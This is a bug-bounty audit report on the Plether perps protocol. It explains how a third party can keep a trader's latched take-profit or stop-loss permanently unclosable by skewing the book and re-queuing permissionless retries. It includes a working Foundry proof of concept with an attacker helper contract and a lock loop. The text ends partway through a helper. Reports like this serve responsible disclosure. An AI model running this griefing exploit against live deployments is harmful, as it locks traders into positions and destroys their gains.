# \#99562 [SC-High] Permissionless `retryPositionProtectionClose` lets any third party keep a latched protection's only exit (`amendLatchedPositionProtectionCloseLimits`) indefinitely unreachable, locking the trader in a position they cannot close 

**Submitted on Nov 14th 2026 at 08:44:11 UTC by @godwinudo for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99562
- **Report Type:** Smart Contract
- **Report severity:** High
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)
  - Contract fails to deliver promised returns, but doesn't lose value

## Description

## Brief/Intro
When a triggered take-profit or stop-loss close fails because it would exceed the trader's own close ceilings, `PositionProtectionBook` does not cancel the protection. It moves it to `Latched`, which keeps the account trade lock and disables every ordinary exit: cancel, replace, cancel-and-close, and a normal close order. The protocol leaves the owner exactly one way out, `amendLatchedPositionProtectionCloseLimits`. That function only works while the account has no pending order, but `retryPositionProtectionClose` is permissionless and immediately queues a new pending close with the old ceilings. Any third party who fails the current attempt and retries it in the same transaction, or back-runs whoever failed it, keeps a live child in the queue at all times, so the owner's amendment always reverts. The attacker does not even need a price gap to cause the first failure: an opposite-side position raises the close's VPI above the trader's action-charge ceiling, and it keeps every retry failing regardless of price. In the end-to-end PoC, a $100k LONG whose take-profit fills normally is instead held for about 1.9 hours while the price reverses 50 bps, and it loses 500.67 USDG compared with the unattacked fill. The trusted emergency pause does not stop the loop, and the operator alert the documentation prescribes ("`Latched` state without a live child") never fires.

## Vulnerability Details

`PositionProtectionBook` stores at most one full-position take-profit/stop-loss per account. When the owner creates it, they also choose four close ceilings (`CloseFinancialLimits`): maximum execution notional, maximum gross account debit, maximum action charge, and maximum explicit fees. These ceilings are the trader's slippage protection for the forced close. The Router copies them into the initial close and into every later retry:

```solidity
// OrderLiquidationBatchLogic.sol
/// @dev Shares fresh timing and the Book's trader-authorized financial ceilings across initial and retried closes;
///      callers supply their distinct client ids. Omitted margin and minimum-bound fields remain zero-initialized.
function _protectionCloseRequest(
    IOrderLiquidationBatchHost host,
    uint64 protectionId,
    CfdTypes.Side side,
    uint256 size
) private view returns (OrderV3Types.OrderRequest memory request) {
    PositionProtectionTypes.CloseFinancialLimits memory limits =
        host.positionProtectionBook().closeFinancialLimits(protectionId);
    ...
    request.bounds.maxExecutionNotionalAssets = limits.maxExecutionNotionalAssets;
    request.bounds.maxGrossAccountDebitAssets = limits.maxGrossAccountDebitAssets;
    request.bounds.maxActionChargeAssets = limits.maxActionChargeAssets;
    request.bounds.maxExplicitFeesAssets = limits.maxExplicitFeesAssets;
    ...
}
```

The team added these ceilings to fix Cecuro MED-9 and described the intended recovery when a ceiling blocks the close: "Only the owner may amend the retained ceilings while protection is Latched; keepers cannot relax them. ... A triggered close remains a market close, so these financial ceilings do not guarantee a fill at the trigger price. Tight limits may prevent execution until conditions improve or the owner amends them."

When a price crosses a trigger, anyone can call `triggerPositionProtection`. It queues a full close as a protection attempt and moves the protection to `Triggered`. If execution of that attempt breaks one of the ceilings, the policy evaluator reverts with `ConstraintViolation`, the execution sidecar classifies it as terminal, and terminal cleanup hands the attempt back to the Book:

```solidity
// OrderRouter.sol — _settleTerminalBounty
if (!success && lifecycleBook.isProtectionAttempt(order.orderId)) {
    if (bountyAssets != 0) {
        revert OrderRouter__ProtectedCloseBountyNonzero(bountyAssets);
    }
    positionProtectionBook.handleFailedProtectionAttempt(order.orderId, order.account, reason);
}
```

```solidity
// PositionProtectionBook.sol — handleFailedProtectionAttempt
delete _attemptProtectionIds[orderId];
retained = _positionMatches(protection);
emit PositionProtectionCloseAttemptFailed(protectionId, account, orderId, reason, retained);
if (retained) {
    protection.status = PositionProtectionTypes.PositionProtectionStatus.Latched;
    return true;
}
```

`SECURITY.md` describes the resulting state: "Triggering is irreversible. `Triggered` means the Book has exactly one current live child; `Latched` means the trigger evidence and account trade lock remain, but no child is live. ... Retry is permissionless ... It does not re-evaluate the threshold, and a recovered price cannot cancel the close mandate."

The account trade lock really does remove every other exit. Cancel and replace accept only `PendingOpen` or `Armed`:

```solidity
// PositionProtectionBook.sol — _cancel (and identically in _replace)
if (
    status != PositionProtectionTypes.PositionProtectionStatus.PendingOpen
        && status != PositionProtectionTypes.PositionProtectionStatus.Armed
) {
    revert OrderRouter__ProtectionNotArmed();
}
```

The atomic "cancel protection and close" helper accepts only `Armed`:

```solidity
// PositionProtectionBook.sol — cancelPositionProtectionAndCommitClose
StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Armed) {
    revert OrderRouter__ProtectionNotArmed();
}
```

and a normal close order is rejected while any protection is active:

```solidity
// OrderLiquidationBatchLogic.sol — _validateFreshRequest
if (enforceProtectionLock && host.positionProtectionBook().activePositionProtectionId(account) != 0) {
    revert OrderRouter__ProtectionActive();
}
```

The only function left to the owner is the amendment:

```solidity
// PositionProtectionBook.sol
function amendLatchedPositionProtectionCloseLimits(
    uint64 protectionId,
    PositionProtectionTypes.CloseFinancialLimits calldata limits
) external nonReentrant {
    StoredProtection storage protection = _ownedActiveProtection(protectionId, msg.sender);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    if (IPositionProtectionRouterHost(ROUTER).pendingOrderCounts(msg.sender) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
    _setCloseLimits(protection, limits);
    _emitCloseLimitsUpdated(protection);
}
```

Its interface natspec ("Lets the owner change close limits after a failed attempt relatches, before a fresh retry. ... A live child cannot be changed.") and the official SDK README ("`buildAmendLatchedProtectionCloseLimitsAction` lets the owner change the close limits of a `Latched` protection before a permissionless retry") both assume the owner gets a window between the failed attempt and the next one. Nothing in the code guarantees that window, because the next attempt can be created by anyone, at any time, in the same transaction as the failure:

```solidity
// PositionProtectionBook.sol
function retryPositionProtectionClose(
    uint64 protectionId
) external nonReentrant returns (uint64 linkedOrderId) {
    StoredProtection storage protection = _activeProtection(protectionId);
    if (protection.status != PositionProtectionTypes.PositionProtectionStatus.Latched) {
        revert OrderRouter__ProtectionNotLatched();
    }
    _requireMatchingPosition(protection);

    IPositionProtectionRouterHost router = IPositionProtectionRouterHost(ROUTER);
    if (router.pendingOrderCounts(protection.account) != 0) {
        revert OrderRouter__PendingOrdersExist();
    }
    ...
    linkedOrderId = IPositionProtectionCloseAttemptHost(ROUTER)
        .commitProtectionCloseAttempt(protectionId, protection.account, protection.side, protection.size);
    ...
    _recordCloseAttempt(protection, linkedOrderId);
}
```

`_activeProtection` checks only that the protection exists. There is no ownership check, no cooldown and no owner priority, and the new attempt reuses the stored (old) ceilings through `_protectionCloseRequest`. `_recordCloseAttempt` immediately sets the status back to `Triggered`. Retry is also explicitly kept available under the Router's emergency pause (`IPositionProtectionActions`: "Router pause blocks creation and replacement; cancellation, triggering, and retry remain available").

The two rules therefore collide. Amend needs `Latched` with zero pending orders, and retry turns `Latched` into `Triggered` with one pending order. An attacker deploys a small contract that calls the permissionless `OrderRouter.executeOrder(attemptId, pythUpdateData)` and then `retryPositionProtectionClose(protectionId)` in one transaction. The failing attempt and its replacement land atomically, so a `Latched` protection with no child never exists in any block, and the owner's amendment always reverts with `OrderRouter__ProtectionNotLatched`, because the status it observes is always `Triggered`. If an honest keeper processes the attempt first (it is an ordinary FIFO head, so keepers must clear it to reach later orders), the attacker back-runs that keeper transaction with a bare `retryPositionProtectionClose`. The owner would have to land an amendment between two transactions that a bot submits back to back. An ordinary user of the official SDK, whose amend action is a single call, cannot do that.

The attacker still needs the attempt to fail. Natural price gaps do this whenever the gap exceeds the slack in the trader's ceilings (for example, a stop crossed during the weekend oracle freeze can only fire at the Sunday reopen price), but the attacker can also cause the failure on demand with a sensible ceiling, no price gap, and even on a take-profit. The close's action charge includes its VPI. The whitepaper states that a close must "collect required carry, VPI, execution-fee, and frozen-spread action charges in full", and the policy evaluator checks the assessed charge against the trader's ceiling:

```solidity
// CfdOrderPolicyEvaluatorBase.sol — close assessment
assessment.actionChargeAssessedAssets = _netOpenActionCharge(
    delta.realizedCarryAssets, int256(delta.actionChargeAssessedAssets) - int256(delta.actionRebateAssets)
);
...
// _enforceBounds
_requireMaximum(
    OrderV3Types.ConstraintKind.ActionCharge,
    assessment.actionChargeAssessedAssets,
    bounds.maxActionChargeAssets
);
```

VPI is the change in the skew potential `C(S) = k·S²/(2D)` (whitepaper §5.1, `CfdMath.tryGetSkewCost`: `costWad = (vpiFactorWad * sqSkewOverDepthWad) / WAD / 2`). A close that pushes the book further toward the already-heavy side pays `k·(S_post² − S_pre²)/(2D)`. Using the deployment value `k = 0.01` and a pool depth of about 1.0M USDG, take a $100k LONG closing at its take-profit into a market with about 2% natural short-heavy skew. The close pays about 0.01·(119,700² − 19,950²)/(2·1,002,000) ≈ 70 USDG of VPI plus the 4 bps fee (39.9 USDG), roughly 11 bps in total (the PoC measures 69.86 USDG of VPI and a 109.76 USDG action charge). A 20 bps ceiling (200 USDG, five times the fee) is comfortable. If an unprivileged attacker first opens a $150k SHORT (about 15% of depth, well inside the 40% skew cliff), the same close pays about 0.01·(269,325² − 169,575²)/(2·1,002,000) ≈ 218 USDG of VPI plus 39.9 USDG of fee, about 258 USDG, which breaks the ceiling (the PoC's failure receipt records an `ActionCharge` actual of 258.33 USDG against the 200 USDG limit). Price does not matter: while the attacker holds the skew, every retry fails on `ConstraintKind.ActionCharge`, and because the Book "does not re-evaluate the threshold", a price that moves back through entry does not end the mandate either. The take-profit simply stays hostage.

The SDK README's phrase "before a permissionless retry" does not turn this into accepted behaviour. It describes the order of operations, not a known limitation that a third party can make amendment permanently impossible. `SECURITY.md`'s "Known Limitations" and "Router and keeper limitations" sections contain no such entry. The accepted MED-9 limitation ("Tight limits may prevent execution until conditions improve or the owner amends them") explicitly relies on the owner still being able to amend. Here the ceilings are not tight (the same ceilings fill without the attacker), and the amendment the acknowledgement relies on is exactly what the attacker removes.

The attack is also invisible to the monitoring the documentation prescribes. `SECURITY.md` ("Router and keeper limitations") tells operators that "Liveness depends on keepers processing the terminal attempt and separately appending a retry, and operators must alert on prolonged `Latched` state without a live child". While the attack runs, the protection is `Triggered` with exactly one live child after every block, so that alert never fires.

## Impact Details
The owner of a protected position loses every way to close or change it for as long as a third party keeps the loop running, while the position stays fully exposed to price. On a take-profit, the attacker can hold the exit until the price reverses and the profit is gone. On a stop-loss, the same lock keeps the losses running and can end in liquidation. In the end-to-end PoC, a $100k 10x LONG with ordinary ceilings (20 bps action charge, 10 bps fees, notional +5%, debit ≤ margin) gets closed at its take-profit and ends with 50,169.70 USDG without the attacker. With the attacker, it is held for 125 rounds (about 1.9 hours) while the basket reverses 50 bps, and it ends with 49,669.03 USDG. Throughout, amend, cancel, cancel-and-close and an ordinary close revert in every round, the Router's emergency pause does not stop the loop, and the account always shows "`Triggered` with a live child". The loss scales linearly with position size and with the adverse move during the lock. 


## Proof of Concept

## Proof of Concept

The test asserts that:
- the control take-profit fills with the victim's ceilings;
- under attack, every one of 125 rounds fails and is re-queued, including one round where an honest keeper terminalizes the attempt first and the attacker back-runs the retry, and one round under the Router's emergency pause;
- after every round the protection is `Triggered` with one live child, and amend, cancel, cancel-and-close and an ordinary close all revert while the position stays fully open;
- once the attacker unwinds, the original-ceiling retry fills at the reversed price;
- the victim's loss against the control matches `size × (exit − TP)` = 500 USDG within 5 USDG;
- the attacker's net matches its directional gain minus fees and bounty;
- all USDG stays inside the pool and clearinghouse.

Create a file `packages/perps/test/perps/judge/JudgeLatchedProtectionLockE2E.t.sol`, input the code below, and run with:

```bash
forge test --root packages/perps --match-path "test/perps/judge/JudgeLatchedProtectionLockE2E.t.sol" -vv
```

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {LegacyOrderRouterHarness} from "../../utils/LegacyOrderRouterHarness.sol";
import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {IOrderRouterErrors} from "@plether/perps/interfaces/IOrderRouterErrors.sol";
import {IPositionProtectionActions} from "@plether/perps/interfaces/IPositionProtectionActions.sol";
import {IPositionProtectionViews} from "@plether/perps/interfaces/IPositionProtectionViews.sol";
import {PositionProtectionTypes} from "@plether/perps/interfaces/PositionProtectionTypes.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";

/// @dev Attacker-deployed helper: runs the doomed protection attempt and re-queues it in the same transaction, so a
///      relatched protection is never observable without a live child.
contract LatchKeeper {

    LegacyOrderRouterHarness internal immutable ROUTER;
    IPositionProtectionActions internal immutable BOOK;
    address internal immutable OWNER;

    constructor(
        LegacyOrderRouterHarness router_,
        IPositionProtectionActions book_
    ) {
        ROUTER = router_;
        BOOK = book_;
        OWNER = msg.sender;
    }

    function failAndRetry(
        uint64 attemptId,
        bytes[] calldata pythUpdateData,
        uint64 protectionId
    ) external returns (uint64 nextAttemptId) {
        require(msg.sender == OWNER, "owner");
        OrderV3Types.ExecutionResult memory result = ROUTER.executeOrder(attemptId, pythUpdateData);
        require(result.status == OrderV3Types.LifecycleStatus.Failed, "attempt filled");
        nextAttemptId = BOOK.retryPositionProtectionClose(protectionId);
    }

}

/// @title End-to-end PoC: a third party keeps a latched take-profit's only exit (limit amendment) unreachable.
/// @dev Full production stack from BasePerpTest (engine, planner, settlement sidecar, clearinghouse, HousePool, tranche
///      vaults, PletherOracle, OrderRouter + sidecars + lifecycle book + PositionProtectionBook). Pyth is the shared
///      MockPyth driven only through signed-tick update payloads passed to public entrypoints. Risk params are the
///      Arbitrum Sepolia deployment values; the deployment's pool caps and Router/oracle overrides are applied through
///      the owner's 72h proposal paths. Junior LP capital enters through the vault and the permissionless epoch settlement.
contract JudgeLatchedProtectionLockE2ETest is BasePerpTest {

    // ---- actors (all fresh EOAs, funded only by token mint + public clearinghouse deposit) ----
    address internal constant LP = address(0x1111);
    address internal constant VICTIM = address(0xA11CE);
    address internal constant ATTACKER = address(0xBAD);
    address internal constant BACKGROUND_TRADER = address(0xCA201);
    address internal constant KEEPER = address(0xE0EC);

    // ---- deployment configuration (script/DeployPerpsArbitrumSepolia.s.sol) ----
    uint256 internal constant DEPLOY_VPI_FACTOR = 0.01e18;
    uint256 internal constant DEPLOY_MAX_SKEW_RATIO = 0.4e18;
    uint256 internal constant DEPLOY_MAINT_MARGIN_BPS = 10;
    uint256 internal constant DEPLOY_INIT_MARGIN_BPS = 20;
    uint256 internal constant DEPLOY_FAD_MARGIN_BPS = 300;
    uint256 internal constant DEPLOY_BASE_CARRY_BPS = 500;
    uint256 internal constant DEPLOY_MIN_BOUNTY_ASSETS = 1e6;
    uint256 internal constant DEPLOY_BOUNTY_BPS = 10;
    uint256 internal constant DEPLOY_KEEPER_SHARE_BPS = 5000;
    uint256 internal constant DEPLOY_MIN_OPEN_NOTIONAL_ASSETS = 1000e6;
    uint256 internal constant DEPLOY_ADVERSE_CONFIDENCE_MULTIPLIER_BPS = 2500;
    uint256 internal constant DEPLOY_MAX_SENIOR_EXPOSURE_ASSETS = 40_000_000e6;
    uint256 internal constant DEPLOY_MAX_SENIOR_SHARE_BPS = 8000;
    uint256 internal constant EXECUTION_FEE_BPS = 4; // CfdEngine default; not overridden by the deployment script

    // ---- market ----
    uint256 internal constant LP_DEPOSIT_ASSETS = 1_000_000e6;
    uint256 internal constant ENTRY_PRICE = 1e8; // basket $1.0000
    uint256 internal constant APPROACH_PRICE = 99_950_000; // $0.9995, 5 bps above the take-profit
    uint256 internal constant TAKE_PROFIT_PRICE = 99_750_000; // $0.9975: LONG take-profit 25 bps in the money
    uint256 internal constant EXIT_PRICE = 100_250_000; // $1.0025: price reverses 50 bps while the victim is locked
    uint256 internal constant LOCK_ROUNDS = 125;
    uint256 internal constant ROUND_SECONDS = 55; // < 60s execution window; 125 rounds ~= 1.9 hours
    uint256 internal constant PRICE_STEP = (EXIT_PRICE - TAKE_PROFIT_PRICE) / LOCK_ROUNDS;
    uint256 internal constant KEEPER_ROUND = 40; // an honest keeper terminalizes first; attacker back-runs the retry
    uint256 internal constant PAUSE_ROUND = 80; // trusted emergency pause is active for this round
    uint256 internal constant SLIPPAGE_BPS = 50;

    uint256 internal constant BACKGROUND_SIZE = 120_000e18; // organic SHORT interest: ~2% natural short-heavy skew
    uint256 internal constant BACKGROUND_MARGIN = 12_000e6;
    uint256 internal constant VICTIM_SIZE = 100_000e18; // $100k LONG at 10x
    uint256 internal constant VICTIM_MARGIN = 10_000e6;
    uint256 internal constant ATTACKER_SIZE = 150_000e18; // ~15% of pool depth, inside the 40% skew cliff
    uint256 internal constant ATTACKER_MARGIN = 5000e6;
    uint256 internal constant TRADER_FUNDING = 50_000e6;

    // ---- victim's protection ceilings: all finite and ordinary-slippage sized ----
    uint256 internal constant VICTIM_MAX_NOTIONAL = 105_000e6; // notional + 5%
    uint256 internal constant VICTIM_MAX_GROSS_DEBIT = VICTIM_MARGIN; // never debit more than the margin
    uint256 internal constant VICTIM_MAX_ACTION_CHARGE = 200e6; // 20 bps of notional, 5x the 4 bps fee
    uint256 internal constant VICTIM_MAX_EXPLICIT_FEES = 100e6; // 10 bps of notional

    uint256 internal constant ORACLE_TO_ASSETS = 1e20; // size(1e18) * price(1e8) / 1e20 = 6-decimal assets
    uint256 internal constant SETTLEMENT_TOLERANCE = 5e6; // fee/VPI/carry differences on slightly different notional

    IPositionProtectionActions internal book;
    IPositionProtectionViews internal views;
    uint256 internal clientNonce;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: DEPLOY_VPI_FACTOR,
            maxSkewRatio: DEPLOY_MAX_SKEW_RATIO,
            maintMarginBps: DEPLOY_MAINT_MARGIN_BPS,
            initMarginBps: DEPLOY_INIT_MARGIN_BPS,
            fadMarginBps: DEPLOY_FAD_MARGIN_BPS,
            baseCarryBps: DEPLOY_BASE_CARRY_BPS,
            minBountyAssets: DEPLOY_MIN_BOUNTY_ASSETS,
            bountyBps: DEPLOY_BOUNTY_BPS,
            keeperShareBps: DEPLOY_KEEPER_SHARE_BPS,
            protocolShareBps: 0
        });
    }

    /// @dev Junior LP capital is added below through the public vault path instead of the base helper.
    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();
        book = IPositionProtectionActions(address(router.positionProtectionBook()));
        views = IPositionProtectionViews(address(router.positionProtectionBook()));

        // Owner applies the deployment's pool and Router/oracle values through the documented 72h proposal paths
        // (replacing the base harness's test-only senior caps).
        IHousePool.PoolConfig memory poolConfig = _currentPoolConfig();
        poolConfig.maxSeniorExposureAssets = DEPLOY_MAX_SENIOR_EXPOSURE_ASSETS;
        poolConfig.maxSeniorShareBps = DEPLOY_MAX_SENIOR_SHARE_BPS;
        pool.proposePoolConfig(poolConfig);
        IOrderRouterAdminHost.RouterConfig memory config = _routerConfig();
        config.minOpenNotionalAssets = DEPLOY_MIN_OPEN_NOTIONAL_ASSETS;
        config.adverseConfidenceMultiplierBps = DEPLOY_ADVERSE_CONFIDENCE_MULTIPLIER_BPS;
        routerAdmin.proposeRouterConfig(config);
        uint256 activation = pool.poolConfigActivationTime() > routerAdmin.routerConfigActivationTime()
            ? pool.poolConfigActivationTime()
            : routerAdmin.routerConfigActivationTime();
        vm.warp(activation + 1);
        pool.finalizePoolConfig();
        routerAdmin.finalizeRouterConfig();

        // Junior LP deposits through the vault; the epoch settles permissionlessly (no open positions yet).
        settlementToken.mint(LP, LP_DEPOSIT_ASSETS);
        vm.startPrank(LP);
        settlementToken.approve(address(juniorVault), LP_DEPOSIT_ASSETS);
        uint256 requestId = juniorVault.requestDeposit(LP_DEPOSIT_ASSETS, LP, LP);
        vm.stopPrank();
        uint256 epochStart = juniorVault.depositEpochStart(requestId);
        if (vm.getBlockTimestamp() < epochStart) {
            vm.warp(epochStart);
        }
        _refresh(ENTRY_PRICE);
        vm.prank(LP);
        pool.settleLpEpoch(0, 0);
        uint256 claimable = juniorVault.claimableDepositRequest(requestId, LP);
        vm.prank(LP);
        juniorVault.claimDeposit(requestId, claimable, LP, LP);

        _fundTrader(VICTIM, TRADER_FUNDING);
        _fundTrader(ATTACKER, TRADER_FUNDING);
        _fundTrader(BACKGROUND_TRADER, TRADER_FUNDING);
        _refresh(ENTRY_PRICE);
    }

    function test_PoC_ThirdPartyKeepsLatchedTakeProfitLocked() public {
        // 0. Preconditions: ordinary weekday session, pool funded, no positions.
        assertFalse(engine.isOracleFrozen(), "live market");
        assertFalse(engine.isFadWindow(), "no FAD");
        uint256 protocolCashBefore =
            settlementToken.balanceOf(address(pool)) + settlementToken.balanceOf(address(clearinghouse));
        uint256 victimBefore = clearinghouse.balanceAssets(VICTIM);
        uint256 attackerBefore = clearinghouse.balanceAssets(ATTACKER);

        // 1. Organic market: a background trader opens SHORT; the victim opens a 10x LONG.
        _trade(BACKGROUND_TRADER, CfdTypes.Side.SHORT, BACKGROUND_SIZE, BACKGROUND_MARGIN, ENTRY_PRICE, false);
        _trade(VICTIM, CfdTypes.Side.LONG, VICTIM_SIZE, VICTIM_MARGIN, ENTRY_PRICE, false);
        _refresh(ENTRY_PRICE);

        // 2. Victim attaches a take-profit with finite, ordinary close ceilings.
        PositionProtectionTypes.PositionProtectionParams memory params;
        params.takeProfitTriggerPrice = TAKE_PROFIT_PRICE;
        params.closeLimits = PositionProtectionTypes.CloseFinancialLimits({
            maxExecutionNotionalAssets: VICTIM_MAX_NOTIONAL,
            maxGrossAccountDebitAssets: VICTIM_MAX_GROSS_DEBIT,
            maxActionChargeAssets: VICTIM_MAX_ACTION_CHARGE,
            maxExplicitFeesAssets: VICTIM_MAX_EXPLICIT_FEES
        });
        vm.prank(VICTIM);
        uint64 protectionId = book.createPositionProtection(params);

        // 3. CONTROL branch (no attacker): price reaches the take-profit and the protected close fills.
        uint256 snapshot = vm.snapshotState();
        _refresh(APPROACH_PRICE);
        uint64 controlAttempt = _trigger(protectionId, TAKE_PROFIT_PRICE);
        assertEq(
            uint8(_execute(KEEPER, controlAttempt, TAKE_PROFIT_PRICE, 1).status),
            uint8(OrderV3Types.LifecycleStatus.Executed),
            "control: take-profit fills within the victim's ceilings"
        );
        (uint256 controlSize,,,,,,) = engine.positions(VICTIM);
        assertEq(controlSize, 0, "control: position closed at the take-profit");
        uint256 victimControlFinal = clearinghouse.balanceAssets(VICTIM);
        vm.revertToState(snapshot);

        // 4. ATTACK: as price approaches the take-profit the attacker opens a SHORT that skews the book.
        _trade(ATTACKER, CfdTypes.Side.SHORT, ATTACKER_SIZE, ATTACKER_MARGIN, APPROACH_PRICE, false);
        vm.prank(ATTACKER);
        LatchKeeper latchKeeper = new LatchKeeper(router, book);

        // 5. Take-profit triggers at the same price as the control.
        uint64 attemptId = _trigger(protectionId, TAKE_PROFIT_PRICE);

        // 6. Lock loop over ~1.9h while the price reverses 50 bps through entry.
        uint256 price = TAKE_PROFIT_PRICE;
        for (uint256 round; round < LOCK_ROUNDS; ++round) {
            uint64 commitTime = _commitTime(attemptId);
            _nextBlock(commitTime + ROUND_SECONDS);
            bytes[] memory tick = _tick(price, commitTime + 1, commitTime);

            if (round == KEEPER_ROUND) {
                // 6a. Honest keeper processes the FIFO head first; the attempt fails and relatches...
                vm.prank(KEEPER);
                assertEq(uint8(router.executeOrder(attemptId, tick).status), uint8(OrderV3Types.LifecycleStatus.Failed));
                // ...and the attacker back-runs with a permissionless retry before the owner's amendment lands.
                vm.prank(ATTACKER);
                attemptId = book.retryPositionProtectionClose(protectionId);
            } else if (round == PAUSE_ROUND) {
                // 6b. The trusted emergency pause does not stop the loop.
                routerAdmin.pause();
                vm.prank(ATTACKER);
                attemptId = latchKeeper.failAndRetry(attemptId, tick, protectionId);
                vm.prank(VICTIM);
                vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
                book.amendLatchedPositionProtectionCloseLimits(protectionId, _unlimited());
                routerAdmin.unpause();
            } else {
                // 6c. Attacker runs the doomed attempt and re-queues it atomically.
                vm.prank(ATTACKER);
                attemptId = latchKeeper.failAndRetry(attemptId, tick, protectionId);
            }

            // 6d. Observable state is always "Triggered with a live child" (never "Latched without child").
            assertEq(
                uint8(views.getPositionProtection(protectionId).status),
                uint8(PositionProtectionTypes.PositionProtectionStatus.Triggered),
                "live child present"
            );
            assertEq(router.pendingOrderCounts(VICTIM), 1, "one live protection child");

            // 6e. Every owner exit reverts.
            _assertVictimLockedOut(protectionId);
            (uint256 lockedSize,,,,,,) = engine.positions(VICTIM);
            assertEq(lockedSize, VICTIM_SIZE, "victim remains fully exposed");

            price += PRICE_STEP;
        }
        assertEq(price, EXIT_PRICE, "price path ends at the reversal level");

        // 7. Attacker unwinds at the reversal price. The live attempt ahead of it fails once more (FIFO) and relatches.
        OrderV3Types.OrderRequest memory unwind = _request(CfdTypes.Side.SHORT, ATTACKER_SIZE, 0, EXIT_PRICE, true);
        vm.prank(ATTACKER);
        uint64 unwindId = router.commitOrder(unwind);
        _execute(KEEPER, attemptId, EXIT_PRICE, 1);
        _execute(KEEPER, unwindId, EXIT_PRICE, 1);
        (uint256 attackerSize,,,,,,) = engine.positions(ATTACKER);
        assertEq(attackerSize, 0, "attacker flat");

        // 8. Only now can a retry with the victim's ORIGINAL ceilings fill - at the reversed price.
        vm.prank(KEEPER);
        uint64 finalAttempt = book.retryPositionProtectionClose(protectionId);
        assertEq(
            uint8(_execute(KEEPER, finalAttempt, EXIT_PRICE, 1).status),
            uint8(OrderV3Types.LifecycleStatus.Executed),
            "same ceilings fill once the attacker's skew is gone"
        );
        (uint256 victimSize,,,,,,) = engine.positions(VICTIM);
        assertEq(victimSize, 0, "victim finally closed");

        // 9. Impact. Expected victim loss is the price gap between the take-profit and the forced exit,
        //    size * (EXIT - TP), computed independently of protocol accounting.
        uint256 victimAttackFinal = clearinghouse.balanceAssets(VICTIM);
        uint256 expectedVictimLoss = (VICTIM_SIZE * (EXIT_PRICE - TAKE_PROFIT_PRICE)) / ORACLE_TO_ASSETS;
        assertEq(expectedVictimLoss, 500e6, "independent expected loss: $500 on a $100k position");
        assertGt(victimControlFinal, victimAttackFinal, "victim worse off under attack");
        assertApproxEqAbs(
            victimControlFinal - victimAttackFinal, expectedVictimLoss, SETTLEMENT_TOLERANCE, "victim loss"
        );
        assertGt(victimControlFinal, victimBefore, "control: take-profit was a gain");
        assertLt(victimAttackFinal, victimBefore, "attack: the gain became a loss");

        // 10. Attacker result: directional gain on its own SHORT minus explicit fees on both legs and the opening
        //     keeper bounty (clamped to the Router's configured bounds); VPI round-trips (paid on open, rebated on
        //     close) and ~1.9h of carry fall within the tolerance.
        uint256 attackerOpenNotional = (ATTACKER_SIZE * APPROACH_PRICE) / ORACLE_TO_ASSETS;
        uint256 attackerCloseNotional = (ATTACKER_SIZE * EXIT_PRICE) / ORACLE_TO_ASSETS;
        uint256 attackerPriceGain = attackerCloseNotional - attackerOpenNotional;
        uint256 attackerFees = ((attackerOpenNotional + attackerCloseNotional) * EXECUTION_FEE_BPS) / 10_000;
        uint256 attackerOpenBounty = (attackerOpenNotional * router.openOrderExecutionBountyBps()) / 10_000;
        if (attackerOpenBounty < router.minOpenOrderExecutionBountyAssets()) {
            attackerOpenBounty = router.minOpenOrderExecutionBountyAssets();
        }
        if (attackerOpenBounty > router.maxOpenOrderExecutionBountyAssets()) {
            attackerOpenBounty = router.maxOpenOrderExecutionBountyAssets();
        }
        int256 attackerNet = int256(clearinghouse.balanceAssets(ATTACKER)) - int256(attackerBefore);
        assertApproxEqAbs(
            attackerNet,
            int256(attackerPriceGain) - int256(attackerFees) - int256(attackerOpenBounty),
            SETTLEMENT_TOLERANCE,
            "attacker net after fees"
        );

        // 11. Protocol custody: every USDG movement stayed inside pool + clearinghouse (no leakage).
        assertEq(
            settlementToken.balanceOf(address(pool)) + settlementToken.balanceOf(address(clearinghouse)),
            protocolCashBefore,
            "protocol USDG conserved"
        );
    }

    // ------------------------------------------------------------------------------------------------------------
    // helpers: every state change below is a public-entrypoint transaction by the named actor
    // ------------------------------------------------------------------------------------------------------------

    function _assertVictimLockedOut(
        uint64 protectionId
    ) internal {
        vm.startPrank(VICTIM);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotLatched.selector);
        book.amendLatchedPositionProtectionCloseLimits(protectionId, _unlimited());
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        book.cancelPositionProtection(protectionId);
        OrderV3Types.OrderRequest memory close =
            _request(CfdTypes.Side.LONG, VICTIM_SIZE, 0, engine.lastMarkPrice(), true);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionNotArmed.selector);
        book.cancelPositionProtectionAndCommitClose(protectionId, close);
        vm.expectRevert(IOrderRouterErrors.OrderRouter__ProtectionActive.selector);
        router.commitOrder(close);
        vm.stopPrank();
    }

    function _unlimited() internal pure returns (PositionProtectionTypes.CloseFinancialLimits memory limits) {
        limits = PositionProtectionTypes.CloseFinancialLimits(
            type(uint256).max, type(uint256).max, type(uint256).max, type(uint256).max
        );
    }

    function _trade(
        address account,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        uint256 price,
        bool isClose
    ) internal {
        OrderV3Types.OrderRequest memory request = _request(side, size, margin, price, isClose);
        vm.prank(account);
        uint64 orderId = router.commitOrder(request);
